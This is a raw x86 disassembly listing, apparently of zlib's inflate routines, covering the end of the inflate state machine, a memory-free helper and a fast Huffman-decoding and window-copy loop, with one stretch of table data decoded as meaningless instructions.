   1ca9b:	shl    eax,cl
   1ca9d:	add    edi,0x8
   1caa0:	add    ebx,eax
   1caa2:	inc    DWORD PTR [ebp-0x4]
   1caa5:	cmp    edi,0x20
   1caa8:	jb     0x1ca86
   1caaa:	mov    edx,DWORD PTR [ebp+0x8]
   1caad:	mov    eax,DWORD PTR [ebp-0x1c]
   1cab0:	sub    eax,DWORD PTR [ebp-0x14]
   1cab3:	add    DWORD PTR [edx+0x14],eax
   1cab6:	add    DWORD PTR [esi+0x1c],eax
   1cab9:	mov    DWORD PTR [ebp-0x1c],eax
   1cabc:	test   eax,eax
   1cabe:	je     0x1cae8
   1cac0:	push   eax
   1cac1:	mov    eax,DWORD PTR [ebp-0x18]
   1cac4:	sub    eax,DWORD PTR [ebp-0x1c]
   1cac7:	cmp    DWORD PTR [esi+0x10],0x0
   1cacb:	push   eax
   1cacc:	push   DWORD PTR [esi+0x18]
   1cacf:	je     0x1cad8
   1cad1:	call   0x1da28
   1cad6:	jmp    0x1cadd
   1cad8:	call   0x1d586
   1cadd:	mov    ecx,DWORD PTR [ebp+0x8]
   1cae0:	mov    DWORD PTR [esi+0x18],eax
   1cae3:	mov    DWORD PTR [ecx+0x30],eax
   1cae6:	mov    edx,ecx
   1cae8:	cmp    DWORD PTR [esi+0x10],0x0
   1caec:	mov    eax,DWORD PTR [ebp-0x14]
   1caef:	mov    DWORD PTR [ebp-0x1c],eax
   1caf2:	mov    eax,ebx
   1caf4:	jne    0x1cb19
   1caf6:	and    eax,0xff00
   1cafb:	mov    ecx,ebx
   1cafd:	shl    ecx,0x10
   1cb00:	add    eax,ecx
   1cb02:	mov    ecx,ebx
   1cb04:	shr    ecx,0x8
   1cb07:	and    ecx,0xff00
   1cb0d:	shl    eax,0x8
   1cb10:	add    eax,ecx
   1cb12:	mov    ecx,ebx
   1cb14:	shr    ecx,0x18
   1cb17:	add    eax,ecx
   1cb19:	cmp    eax,DWORD PTR [esi+0x18]
   1cb1c:	je     0x1cb27
   1cb1e:	mov    DWORD PTR [edx+0x18],0x1eca8
   1cb25:	jmp    0x1cb71
   1cb27:	xor    ebx,ebx
   1cb29:	xor    edi,edi
   1cb2b:	mov    DWORD PTR [esi],0x19
   1cb31:	cmp    DWORD PTR [esi+0x8],0x0
   1cb35:	je     0x1cbaf
   1cb37:	cmp    DWORD PTR [esi+0x10],0x0
   1cb3b:	je     0x1cbaf
   1cb3d:	cmp    edi,0x20
   1cb40:	jae    0x1cb65
   1cb42:	cmp    DWORD PTR [ebp-0x8],0x0
   1cb46:	je     0x1cbc5
   1cb48:	mov    eax,DWORD PTR [ebp-0x4]
   1cb4b:	movzx  eax,BYTE PTR [eax]
   1cb4e:	dec    DWORD PTR [ebp-0x8]
   1cb51:	mov    ecx,edi
   1cb53:	shl    eax,cl
   1cb55:	add    edi,0x8
   1cb58:	add    ebx,eax
   1cb5a:	inc    DWORD PTR [ebp-0x4]
   1cb5d:	cmp    edi,0x20
   1cb60:	jb     0x1cb42
   1cb62:	mov    edx,DWORD PTR [ebp+0x8]
   1cb65:	cmp    ebx,DWORD PTR [esi+0x1c]
   1cb68:	je     0x1cbab
   1cb6a:	mov    DWORD PTR [edx+0x18],0x1ec90
   1cb71:	mov    DWORD PTR [esi],0x1b
   1cb77:	mov    eax,DWORD PTR [esi]
   1cb79:	cmp    eax,0x1c
   1cb7c:	jbe    0x1bb66
   1cb82:	jmp    0x1bb5c
   1cb87:	mov    eax,DWORD PTR [ebp-0x18]
   1cb8a:	mov    DWORD PTR [edx+0xc],eax
   1cb8d:	mov    eax,DWORD PTR [ebp-0x14]
   1cb90:	mov    DWORD PTR [edx+0x10],eax
   1cb93:	mov    eax,DWORD PTR [ebp-0x4]
   1cb96:	mov    DWORD PTR [edx],eax
   1cb98:	mov    eax,DWORD PTR [ebp-0x8]
   1cb9b:	mov    DWORD PTR [edx+0x4],eax
   1cb9e:	mov    DWORD PTR [esi+0x38],ebx
   1cba1:	mov    DWORD PTR [esi+0x3c],edi
   1cba4:	push   0x2
   1cba6:	jmp    0x1bb5e
   1cbab:	xor    ebx,ebx
   1cbad:	xor    edi,edi
   1cbaf:	mov    DWORD PTR [esi],0x1a
   1cbb5:	mov    DWORD PTR [ebp-0x24],0x1
   1cbbc:	jmp    0x1cbc5
   1cbbe:	mov    DWORD PTR [ebp-0x24],0xfffffffd
   1cbc5:	mov    eax,DWORD PTR [ebp+0x8]
   1cbc8:	mov    ecx,DWORD PTR [ebp-0x18]
   1cbcb:	mov    DWORD PTR [eax+0xc],ecx
   1cbce:	mov    ecx,DWORD PTR [ebp-0x14]
   1cbd1:	mov    DWORD PTR [eax+0x10],ecx
   1cbd4:	mov    ecx,DWORD PTR [ebp-0x4]
   1cbd7:	mov    DWORD PTR [eax],ecx
   1cbd9:	mov    ecx,DWORD PTR [ebp-0x8]
   1cbdc:	mov    DWORD PTR [eax+0x4],ecx
   1cbdf:	cmp    DWORD PTR [esi+0x28],0x0
   1cbe3:	mov    DWORD PTR [esi+0x38],ebx
   1cbe6:	mov    DWORD PTR [esi+0x3c],edi
   1cbe9:	jne    0x1cbfb
   1cbeb:	cmp    DWORD PTR [esi],0x18
   1cbee:	jge    0x1cc17
   1cbf0:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbf3:	mov    ecx,DWORD PTR [ebp+0x8]
   1cbf6:	cmp    eax,DWORD PTR [ecx+0x10]
   1cbf9:	je     0x1cc17
   1cbfb:	mov    eax,DWORD PTR [ebp-0x1c]
   1cbfe:	mov    edi,DWORD PTR [ebp+0x8]
   1cc01:	call   0x1ba1e
   1cc06:	test   eax,eax
   1cc08:	je     0x1cc17
   1cc0a:	mov    DWORD PTR [esi],0x1c
   1cc10:	push   0xfffffffc
   1cc12:	jmp    0x1bb5e
   1cc17:	mov    edi,DWORD PTR [ebp+0x8]
   1cc1a:	mov    eax,DWORD PTR [ebp-0x2c]
   1cc1d:	sub    eax,DWORD PTR [edi+0x4]
   1cc20:	mov    ebx,DWORD PTR [ebp-0x1c]
   1cc23:	sub    ebx,DWORD PTR [edi+0x10]
   1cc26:	add    DWORD PTR [edi+0x8],eax
   1cc29:	add    DWORD PTR [edi+0x14],ebx
   1cc2c:	add    DWORD PTR [esi+0x1c],ebx
   1cc2f:	cmp    DWORD PTR [esi+0x8],0x0
   1cc33:	mov    DWORD PTR [ebp-0x2c],eax
   1cc36:	je     0x1cc61
   1cc38:	test   ebx,ebx
   1cc3a:	je     0x1cc61
   1cc3c:	mov    eax,DWORD PTR [edi+0xc]
   1cc3f:	push   ebx
   1cc40:	sub    eax,ebx
   1cc42:	cmp    DWORD PTR [esi+0x10],0x0
   1cc46:	push   eax
   1cc47:	push   DWORD PTR [esi+0x18]
   1cc4a:	je     0x1cc53
   1cc4c:	call   0x1da28
   1cc51:	jmp    0x1cc58
   1cc53:	call   0x1d586
   1cc58:	mov    DWORD PTR [esi+0x18],eax
   1cc5b:	mov    DWORD PTR [edi+0x30],eax
   1cc5e:	mov    eax,DWORD PTR [ebp-0x2c]
   1cc61:	cmp    DWORD PTR [esi],0xb
   1cc64:	jne    0x1cc6d
   1cc66:	mov    ecx,0x80
   1cc6b:	jmp    0x1cc6f
   1cc6d:	xor    ecx,ecx
   1cc6f:	mov    edx,DWORD PTR [esi+0x4]
   1cc72:	neg    edx
   1cc74:	sbb    edx,edx
   1cc76:	and    edx,0x40
   1cc79:	add    edx,ecx
   1cc7b:	add    edx,DWORD PTR [esi+0x3c]
   1cc7e:	mov    DWORD PTR [edi+0x2c],edx
   1cc81:	test   eax,eax
   1cc83:	jne    0x1cc89
   1cc85:	test   ebx,ebx
   1cc87:	je     0x1cc8f
   1cc89:	cmp    DWORD PTR [ebp+0xc],0x4
   1cc8d:	jne    0x1cc9c
   1cc8f:	cmp    DWORD PTR [ebp-0x24],0x0
   1cc93:	jne    0x1cc9c
   1cc95:	mov    DWORD PTR [ebp-0x24],0xfffffffb
   1cc9c:	mov    eax,DWORD PTR [ebp-0x24]
   1cc9f:	jmp    0x1bb5f
   1cca4:	mov    edi,edi
   1cca6:	jo     0x1cc63
   1cca8:	add    DWORD PTR [eax],eax
   1ccaa:	xchg   esp,eax
   1ccab:	mov    esp,0xbd2a0001
   1ccb0:	add    DWORD PTR [eax],eax
   1ccb2:	mov    al,ds:0x190001bd
   1ccb7:	mov    esi,0xbe980001
   1ccbc:	add    DWORD PTR [eax],eax
   1ccbe:	xor    edi,DWORD PTR [edi-0x4033ffff]
   1ccc4:	add    DWORD PTR [eax],eax
   1ccc6:	popa   
   1ccc7:	rol    BYTE PTR [ecx],0x0
   1ccca:	loope  0x1cc8c
   1cccc:	add    DWORD PTR [eax],eax
   1ccce:	aas    
   1cccf:	rol    DWORD PTR [ecx],0x0
   1ccd2:	(bad)  
   1ccd4:	add    DWORD PTR [eax],eax
   1ccd6:	outs   dx,DWORD PTR ds:[esi]
   1ccd7:	rol    DWORD PTR [ecx],0x0
   1ccda:	push   ds
   1ccdb:	ret    0x1
   1ccde:	jle    0x1cca2
   1cce0:	add    DWORD PTR [eax],eax
   1cce2:	aam    0xc2
   1cce4:	add    DWORD PTR [eax],eax
   1cce6:	xchg   esi,eax
   1cce7:	ret    
   1cce8:	add    DWORD PTR [eax],eax
   1ccea:	add    al,0xc6
   1ccec:	add    DWORD PTR [eax],eax
   1ccee:	ins    BYTE PTR es:[edi],dx
   1ccef:	mov    BYTE PTR [ecx],0x0
   1ccf2:	pop    es
   1ccf3:	enter  0x1,0x4d
   1ccf7:	enter  0x1,0x68
   1ccfb:	leave  
   1ccfc:	add    DWORD PTR [eax],eax
   1ccfe:	int3   
   1ccff:	leave  
   1cd00:	add    DWORD PTR [eax],eax
   1cd02:	push   esp
   1cd03:	retf   0x1
   1cd06:	ja     0x1ccd2
   1cd08:	add    DWORD PTR [eax],eax
   1cd0a:	xor    ebx,ecx
   1cd0c:	add    DWORD PTR [eax],eax
   1cd0e:	mov    ch,0xcb
   1cd10:	add    DWORD PTR [eax],eax
   1cd12:	mov    esi,0x100001cb
   1cd17:	int3   
   1cd18:	add    DWORD PTR [eax],eax
   1cd1a:	int3   
   1cd1b:	int3   
   1cd1c:	int3   
   1cd1d:	int3   
   1cd1e:	int3   
   1cd1f:	int3   
   1cd20:	mov    edi,edi
   1cd22:	push   ebp
   1cd23:	mov    ebp,esp
   1cd25:	push   esi
   1cd26:	mov    esi,DWORD PTR [ebp+0x8]
   1cd29:	test   esi,esi
   1cd2b:	je     0x1cd59
   1cd2d:	mov    eax,DWORD PTR [esi+0x1c]
   1cd30:	test   eax,eax
   1cd32:	je     0x1cd59
   1cd34:	mov    ecx,DWORD PTR [esi+0x24]
   1cd37:	test   ecx,ecx
   1cd39:	je     0x1cd59
   1cd3b:	mov    eax,DWORD PTR [eax+0x34]
   1cd3e:	test   eax,eax
   1cd40:	je     0x1cd48
   1cd42:	push   eax
   1cd43:	push   DWORD PTR [esi+0x28]
   1cd46:	call   ecx
   1cd48:	push   DWORD PTR [esi+0x1c]
   1cd4b:	push   DWORD PTR [esi+0x28]
   1cd4e:	call   DWORD PTR [esi+0x24]
   1cd51:	and    DWORD PTR [esi+0x1c],0x0
   1cd55:	xor    eax,eax
   1cd57:	jmp    0x1cd5c
   1cd59:	push   0xfffffffe
   1cd5b:	pop    eax
   1cd5c:	pop    esi
   1cd5d:	pop    ebp
   1cd5e:	ret    0x4
   1cd61:	int3   
   1cd62:	int3   
   1cd63:	int3   
   1cd64:	int3   
   1cd65:	int3   
   1cd66:	mov    edi,edi
   1cd68:	push   ebp
   1cd69:	mov    ebp,esp
   1cd6b:	mov    eax,DWORD PTR [ebp+0xc]
   1cd6e:	imul   eax,DWORD PTR [ebp+0x10]
   1cd72:	push   eax
   1cd73:	call   0x1da4c
   1cd78:	pop    ecx
   1cd79:	pop    ebp
   1cd7a:	ret    0xc
   1cd7d:	int3   
   1cd7e:	int3   
   1cd7f:	int3   
   1cd80:	int3   
   1cd81:	int3   
   1cd82:	mov    edi,edi
   1cd84:	push   ebp
   1cd85:	mov    ebp,esp
   1cd87:	push   DWORD PTR [ebp+0xc]
   1cd8a:	call   0x10a9a
   1cd8f:	pop    ecx
   1cd90:	pop    ebp
   1cd91:	ret    0x8
   1cd94:	int3   
   1cd95:	int3   
   1cd96:	int3   
   1cd97:	int3   
   1cd98:	int3   
   1cd99:	int3   
   1cd9a:	mov    edi,edi
   1cd9c:	push   ebp
   1cd9d:	mov    ebp,esp
   1cd9f:	sub    esp,0x40
   1cda2:	mov    eax,DWORD PTR [ebp+0x8]
   1cda5:	mov    ecx,DWORD PTR [eax+0x4]
   1cda8:	mov    edx,DWORD PTR [eax+0x10]
   1cdab:	push   ebx
   1cdac:	mov    ebx,DWORD PTR [eax]
   1cdae:	dec    ebx
   1cdaf:	lea    ecx,[ecx+ebx*1-0x5]
   1cdb3:	mov    DWORD PTR [ebp-0x2c],ecx
   1cdb6:	mov    ecx,edx
   1cdb8:	sub    ecx,DWORD PTR [ebp+0xc]
   1cdbb:	push   esi
   1cdbc:	mov    esi,DWORD PTR [eax+0x1c]
   1cdbf:	push   edi
   1cdc0:	mov    edi,DWORD PTR [eax+0xc]
   1cdc3:	dec    edi
   1cdc4:	add    ecx,edi
   1cdc6:	mov    DWORD PTR [ebp-0x3c],ecx
   1cdc9:	lea    ecx,[edx+edi*1-0x101]
   1cdd0:	mov    DWORD PTR [ebp-0x30],ecx
   1cdd3:	mov    ecx,DWORD PTR [esi+0x28]
   1cdd6:	mov    DWORD PTR [ebp-0x24],ecx
   1cdd9:	mov    ecx,DWORD PTR [esi+0x2c]
   1cddc:	mov    DWORD PTR [ebp-0x40],ecx
   1cddf:	mov    ecx,DWORD PTR [esi+0x30]
   1cde2:	mov    DWORD PTR [ebp-0x18],ecx
   1cde5:	mov    ecx,DWORD PTR [esi+0x34]
   1cde8:	mov    DWORD PTR [ebp-0x28],ecx
   1cdeb:	mov    ecx,DWORD PTR [esi+0x38]
   1cdee:	mov    DWORD PTR [ebp-0x4],ecx
   1cdf1:	mov    ecx,DWORD PTR [esi+0x3c]
   1cdf4:	mov    DWORD PTR [ebp+0xc],ecx
   1cdf7:	mov    ecx,DWORD PTR [esi+0x4c]
   1cdfa:	xor    edx,edx
   1cdfc:	mov    DWORD PTR [ebp-0x1c],ecx
   1cdff:	mov    ecx,DWORD PTR [esi+0x50]
   1ce02:	inc    edx
   1ce03:	mov    DWORD PTR [ebp-0x20],ecx
   1ce06:	mov    ecx,DWORD PTR [esi+0x54]
   1ce09:	shl    edx,cl
   1ce0b:	mov    ecx,DWORD PTR [esi+0x58]
   1ce0e:	dec    edx
   1ce0f:	mov    DWORD PTR [ebp-0x34],edx
   1ce12:	xor    edx,edx
   1ce14:	inc    edx
   1ce15:	shl    edx,cl
   1ce17:	dec    edx
   1ce18:	mov    DWORD PTR [ebp-0x38],edx
   1ce1b:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce1e:	cmp    ecx,0xf
   1ce21:	jae    0x1ce40
   1ce23:	add    DWORD PTR [ebp+0xc],0x8
   1ce27:	inc    ebx
   1ce28:	movzx  edx,BYTE PTR [ebx]
   1ce2b:	shl    edx,cl
   1ce2d:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce30:	add    DWORD PTR [ebp-0x4],edx
   1ce33:	inc    ebx
   1ce34:	movzx  edx,BYTE PTR [ebx]
   1ce37:	shl    edx,cl
   1ce39:	add    DWORD PTR [ebp-0x4],edx
   1ce3c:	add    DWORD PTR [ebp+0xc],0x8
   1ce40:	mov    ecx,DWORD PTR [ebp-0x34]
   1ce43:	and    ecx,DWORD PTR [ebp-0x4]
   1ce46:	mov    edx,DWORD PTR [ebp-0x1c]
   1ce49:	mov    ecx,DWORD PTR [edx+ecx*4]
   1ce4c:	mov    DWORD PTR [ebp-0x10],ecx
   1ce4f:	mov    edx,DWORD PTR [ebp-0x10]
   1ce52:	shr    ecx,0x8
   1ce55:	movzx  ecx,cl
   1ce58:	shr    DWORD PTR [ebp-0x4],cl
   1ce5b:	sub    DWORD PTR [ebp+0xc],ecx
   1ce5e:	mov    DWORD PTR [ebp-0x8],ecx
   1ce61:	movzx  ecx,dl
   1ce64:	mov    DWORD PTR [ebp-0x8],ecx
   1ce67:	test   ecx,ecx
   1ce69:	je     0x1ceb2
   1ce6b:	mov    ecx,DWORD PTR [ebp-0x8]
   1ce6e:	test   cl,0x10
   1ce71:	jne    0x1cebd
   1ce73:	test   cl,0x40
   1ce76:	jne    0x1d10c
   1ce7c:	xor    edx,edx
   1ce7e:	inc    edx
   1ce7f:	shl    edx,cl
   1ce81:	mov    ecx,DWORD PTR [ebp-0x10]
   1ce84:	shr    ecx,0x10
   1ce87:	dec    edx
   1ce88:	and    edx,DWORD PTR [ebp-0x4]
   1ce8b:	add    edx,ecx
   1ce8d:	mov    ecx,DWORD PTR [ebp-0x1c]
   1ce90:	mov    ecx,DWORD PTR [ecx+edx*4]
   1ce93:	mov    DWORD PTR [ebp-0x10],ecx
   1ce96:	mov    edx,DWORD PTR [ebp-0x10]
   1ce99:	shr    ecx,0x8
   1ce9c:	movzx  ecx,cl
   1ce9f:	shr    DWORD PTR [ebp-0x4],cl
   1cea2:	sub    DWORD PTR [ebp+0xc],ecx
   1cea5:	mov    DWORD PTR [ebp-0x8],ecx
   1cea8:	movzx  ecx,dl
   1ceab:	mov    DWORD PTR [ebp-0x8],ecx
   1ceae:	test   ecx,ecx
   1ceb0:	jne    0x1ce6b
   1ceb2:	inc    edi
   1ceb3:	shr    edx,0x10
   1ceb6:	mov    BYTE PTR [edi],dl
   1ceb8:	jmp    0x1d0ea
   1cebd:	shr    edx,0x10
   1cec0:	and    ecx,0xf
   1cec3:	mov    DWORD PTR [ebp-0xc],edx
   1cec6:	mov    DWORD PTR [ebp-0x8],ecx
   1cec9:	je     0x1cef5
   1cecb:	mov    ecx,DWORD PTR [ebp+0xc]
   1cece:	cmp    ecx,DWORD PTR [ebp-0x8]
   1ced1:	jae    0x1cee0
   1ced3:	inc    ebx
   1ced4:	movzx  edx,BYTE PTR [ebx]
   1ced7:	shl    edx,cl
   1ced9:	add    DWORD PTR [ebp-0x4],edx
   1cedc:	add    DWORD PTR [ebp+0xc],0x8
   1cee0:	mov    ecx,DWORD PTR [ebp-0x8]
   1cee3:	xor    edx,edx
   1cee5:	inc    edx
   1cee6:	shl    edx,cl
   1cee8:	dec    edx
   1cee9:	and    edx,DWORD PTR [ebp-0x4]
   1ceec:	shr    DWORD PTR [ebp-0x4],cl
   1ceef:	add    DWORD PTR [ebp-0xc],edx
   1cef2:	sub    DWORD PTR [ebp+0xc],ecx
   1cef5:	mov    ecx,DWORD PTR [ebp+0xc]
   1cef8:	cmp    ecx,0xf
   1cefb:	jae    0x1cf1a
   1cefd:	add    DWORD PTR [ebp+0xc],0x8
   1cf01:	inc    ebx
   1cf02:	movzx  edx,BYTE PTR [ebx]
   1cf05:	shl    edx,cl
   1cf07:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf0a:	add    DWORD PTR [ebp-0x4],edx
   1cf0d:	inc    ebx
   1cf0e:	movzx  edx,BYTE PTR [ebx]
   1cf11:	shl    edx,cl
   1cf13:	add    DWORD PTR [ebp-0x4],edx
   1cf16:	add    DWORD PTR [ebp+0xc],0x8
   1cf1a:	mov    ecx,DWORD PTR [ebp-0x38]
   1cf1d:	and    ecx,DWORD PTR [ebp-0x4]
   1cf20:	mov    edx,DWORD PTR [ebp-0x20]
   1cf23:	mov    ecx,DWORD PTR [edx+ecx*4]
   1cf26:	jmp    0x1cf46
   1cf28:	test   cl,0x40
   1cf2b:	jne    0x1d103
   1cf31:	xor    edx,edx
   1cf33:	inc    edx
   1cf34:	shl    edx,cl
   1cf36:	movzx  ecx,WORD PTR [ebp-0xe]
   1cf3a:	dec    edx
   1cf3b:	and    edx,DWORD PTR [ebp-0x4]
   1cf3e:	add    edx,ecx
   1cf40:	mov    ecx,DWORD PTR [ebp-0x20]
   1cf43:	mov    ecx,DWORD PTR [ecx+edx*4]
   1cf46:	mov    DWORD PTR [ebp-0x10],ecx
   1cf49:	mov    edx,DWORD PTR [ebp-0x10]
   1cf4c:	shr    ecx,0x8
   1cf4f:	movzx  ecx,cl
   1cf52:	shr    DWORD PTR [ebp-0x4],cl
   1cf55:	sub    DWORD PTR [ebp+0xc],ecx
   1cf58:	mov    DWORD PTR [ebp-0x8],ecx
   1cf5b:	movzx  ecx,dl
   1cf5e:	test   cl,0x10
   1cf61:	je     0x1cf28
   1cf63:	and    ecx,0xf
   1cf66:	shr    edx,0x10
   1cf69:	mov    DWORD PTR [ebp-0x14],edx
   1cf6c:	mov    DWORD PTR [ebp-0x8],ecx
   1cf6f:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf72:	jae    0x1cf9f
   1cf74:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf77:	add    DWORD PTR [ebp+0xc],0x8
   1cf7b:	inc    ebx
   1cf7c:	movzx  edx,BYTE PTR [ebx]
   1cf7f:	shl    edx,cl
   1cf81:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf84:	add    DWORD PTR [ebp-0x4],edx
   1cf87:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf8a:	jae    0x1cf9f
   1cf8c:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf8f:	inc    ebx
   1cf90:	movzx  edx,BYTE PTR [ebx]
   1cf93:	shl    edx,cl
   1cf95:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf98:	add    DWORD PTR [ebp-0x4],edx
   1cf9b:	add    DWORD PTR [ebp+0xc],0x8
   1cf9f:	xor    edx,edx
   1cfa1:	inc    edx
   1cfa2:	shl    edx,cl
   1cfa4:	mov    ecx,DWORD PTR [ebp-0x8]
   1cfa7:	sub    DWORD PTR [ebp+0xc],ecx
   1cfaa:	dec    edx
   1cfab:	and    edx,DWORD PTR [ebp-0x4]
   1cfae:	shr    DWORD PTR [ebp-0x4],cl
   1cfb1:	add    DWORD PTR [ebp-0x14],edx
   1cfb4:	mov    edx,DWORD PTR [ebp-0x14]
   1cfb7:	mov    ecx,edi
   1cfb9:	sub    ecx,DWORD PTR [ebp-0x3c]
   1cfbc:	cmp    edx,ecx
   1cfbe:	jbe    0x1d0b2
   1cfc4:	sub    edx,ecx
   1cfc6:	mov    DWORD PTR [ebp-0x8],edx
   1cfc9:	cmp    edx,DWORD PTR [ebp-0x40]
   1cfcc:	ja     0x1d0fa
   1cfd2:	mov    ecx,DWORD PTR [ebp-0x28]
   1cfd5:	dec    ecx
   1cfd6:	mov    DWORD PTR [ebp-0x10],ecx
   1cfd9:	mov    ecx,DWORD PTR [ebp-0x18]
   1cfdc:	test   ecx,ecx
   1cfde:	jne    0x1d006
   1cfe0:	mov    ecx,DWORD PTR [ebp-0x24]
   1cfe3:	sub    ecx,edx
   1cfe5:	add    DWORD PTR [ebp-0x10],ecx
   1cfe8:	mov    ecx,edx
   1cfea:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfed:	jae    0x1d07b
   1cff3:	sub    DWORD PTR [ebp-0xc],ecx
   1cff6:	mov    ecx,DWORD PTR [ebp-0x10]
   1cff9:	inc    ecx
   1cffa:	mov    dl,BYTE PTR [ecx]
   1cffc:	inc    edi
   1cffd:	dec    DWORD PTR [ebp-0x8]
   1d000:	mov    BYTE PTR [edi],dl
   1d002:	jne    0x1cff9
   1d004:	jmp    0x1d051
   1d006:	cmp    ecx,edx
   1d008:	jae    0x1d05b
   1d00a:	sub    ecx,edx
   1d00c:	add    ecx,DWORD PTR [ebp-0x24]
   1d00f:	add    DWORD PTR [ebp-0x10],ecx
   1d012:	mov    ecx,DWORD PTR [ebp-0x8]
   1d015:	sub    ecx,DWORD PTR [ebp-0x18]
   1d018:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d01b:	jae    0x1d07b
   1d01d:	sub    DWORD PTR [ebp-0xc],ecx
   1d020:	inc    DWORD PTR [ebp-0x10]
   1d023:	mov    edx,DWORD PTR [ebp-0x10]
   1d026:	mov    dl,BYTE PTR [edx]
   1d028:	inc    edi
   1d029:	dec    ecx
   1d02a:	mov    BYTE PTR [edi],dl
   1d02c:	jne    0x1d020
   1d02e:	mov    ecx,DWORD PTR [ebp-0x28]
   1d031:	dec    ecx
   1d032:	mov    DWORD PTR [ebp-0x10],ecx
   1d035:	mov    ecx,DWORD PTR [ebp-0x18]
   1d038:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d03b:	jae    0x1d07b
   1d03d:	sub    DWORD PTR [ebp-0xc],ecx
   1d040:	mov    DWORD PTR [ebp-0x8],ecx
   1d043:	mov    ecx,DWORD PTR [ebp-0x10]
   1d046:	inc    ecx
   1d047:	mov    dl,BYTE PTR [ecx]
   1d049:	inc    edi
   1d04a:	dec    DWORD PTR [ebp-0x8]
   1d04d:	mov    BYTE PTR [edi],dl
   1d04f:	jne    0x1d046
   1d051:	mov    ecx,edi
   1d053:	sub    ecx,DWORD PTR [ebp-0x14]
   1d056:	mov    DWORD PTR [ebp-0x10],ecx
   1d059:	jmp    0x1d07e
   1d05b:	sub    ecx,edx
   1d05d:	add    DWORD PTR [ebp-0x10],ecx
   1d060:	mov    ecx,DWORD PTR [ebp-0x8]
   1d063:	cmp    ecx,DWORD PTR [ebp-0xc]
   1d066:	jae    0x1d07b
   1d068:	sub    DWORD PTR [ebp-0xc],ecx
   1d06b:	mov    ecx,DWORD PTR [ebp-0x10]
   1d06e:	inc    ecx
   1d06f:	mov    dl,BYTE PTR [ecx]
   1d071:	inc    edi
   1d072:	dec    DWORD PTR [ebp-0x8]
   1d075:	mov    BYTE PTR [edi],dl
   1d077:	jne    0x1d06e
   1d079:	jmp    0x1d051
   1d07b:	mov    ecx,DWORD PTR [ebp-0x10]
   1d07e:	mov    edx,DWORD PTR [ebp-0xc]
   1d081:	cmp    edx,0x2
   1d084:	jbe    0x1d0d2
   1d086:	lea    eax,[edx-0x3]
   1d089:	push   0x3
   1d08b:	xor    edx,edx
   1d08d:	pop    ecx
   1d08e:	div    ecx
   1d090:	mov    ecx,DWORD PTR [ebp-0x10]
   1d093:	inc    eax
   1d094:	sub    DWORD PTR [ebp-0xc],0x3
   1d098:	inc    ecx
   1d099:	mov    dl,BYTE PTR [ecx]
   1d09b:	inc    edi
   1d09c:	mov    BYTE PTR [edi],dl
   1d09e:	inc    ecx
   1d09f:	mov    dl,BYTE PTR [ecx]
   1d0a1:	inc    edi
   1d0a2:	inc    ecx
   1d0a3:	mov    BYTE PTR [edi],dl
   1d0a5:	mov    dl,BYTE PTR [ecx]
   1d0a7:	inc    edi
   1d0a8:	dec    eax
   1d0a9:	mov    BYTE PTR [edi],dl
   1d0ab:	jne    0x1d094
   1d0ad:	mov    eax,DWORD PTR [ebp+0x8]
   1d0b0:	jmp    0x1d0d2
   1d0b2:	mov    ecx,edi
   1d0b4:	sub    ecx,edx
   1d0b6:	sub    DWORD PTR [ebp-0xc],0x3
   1d0ba:	inc    ecx
   1d0bb:	mov    dl,BYTE PTR [ecx]
   1d0bd:	inc    edi
   1d0be:	mov    BYTE PTR [edi],dl
   1d0c0:	inc    ecx
   1d0c1:	mov    dl,BYTE PTR [ecx]
   1d0c3:	inc    edi
   1d0c4:	inc    ecx
   1d0c5:	mov    BYTE PTR [edi],dl
   1d0c7:	mov    dl,BYTE PTR [ecx]
   1d0c9:	inc    edi
   1d0ca:	cmp    DWORD PTR [ebp-0xc],0x2
   1d0ce:	mov    BYTE PTR [edi],dl
   1d0d0:	ja     0x1d0b6
   1d0d2:	cmp    DWORD PTR [ebp-0xc],0x0
   1d0d6:	je     0x1d0ea
   1d0d8:	inc    ecx
   1d0d9:	mov    dl,BYTE PTR [ecx]
   1d0db:	inc    edi
   1d0dc:	cmp    DWORD PTR [ebp-0xc],0x1
   1d0e0:	mov    BYTE PTR [edi],dl
   1d0e2:	jbe    0x1d0ea
   1d0e4:	mov    cl,BYTE PTR [ecx+0x1]
   1d0e7:	inc    edi
   1d0e8:	mov    BYTE PTR [edi],cl
   1d0ea:	cmp    ebx,DWORD PTR [ebp-0x2c]
   1d0ed:	jae    0x1d126
   1d0ef:	cmp    edi,DWORD PTR [ebp-0x30]
   1d0f2:	jb     0x1ce1b
   1d0f8:	jmp    0x1d126
   1d0fa:	mov    DWORD PTR [eax+0x18],0x1ecbe
   1d101:	jmp    0x1d120
   1d103:	mov    DWORD PTR [eax+0x18],0x1ecdc
   1d10a:	jmp    0x1d120
   1d10c:	test   cl,0x20
   1d10f:	je     0x1d119
   1d111:	mov    DWORD PTR [esi],0xb
   1d117:	jmp    0x1d126
   1d119:	mov    DWORD PTR [eax+0x18],0x1ecf2
   1d120:	mov    DWORD PTR [esi],0x1b
   1d126:	mov    ecx,DWORD PTR [ebp+0xc]
   1d129:	shr    ecx,0x3
   1d12c:	sub    ebx,ecx
   1d12e:	shl    ecx,0x3
   1d131:	sub    DWORD PTR [ebp+0xc],ecx
   1d134:	xor    ecx,ecx
   1d136:	inc    ecx
   1d137:	mov    edx,ecx
   1d139:	mov    ecx,DWORD PTR [ebp+0xc]
   1d13c:	shl    edx,cl
   1d13e:	dec    edx
   1d13f:	mov    ecx,edx
   1d141:	mov    edx,DWORD PTR [ebp-0x4]
   1d144:	and    edx,ecx
   1d146:	lea    ecx,[ebx+0x1]
   1d149:	mov    DWORD PTR [eax],ecx
   1d14b:	lea    ecx,[edi+0x1]
   1d14e:	mov    DWORD PTR [eax+0xc],ecx
   1d151:	mov    ecx,DWORD PTR [ebp-0x2c]
   1d154:	sub    ecx,ebx
   1d156:	add    ecx,0x5
   1d159:	mov    DWORD PTR [eax+0x4],ecx
   1d15c:	mov    ecx,DWORD PTR [ebp-0x30]
   1d15f:	sub    ecx,edi
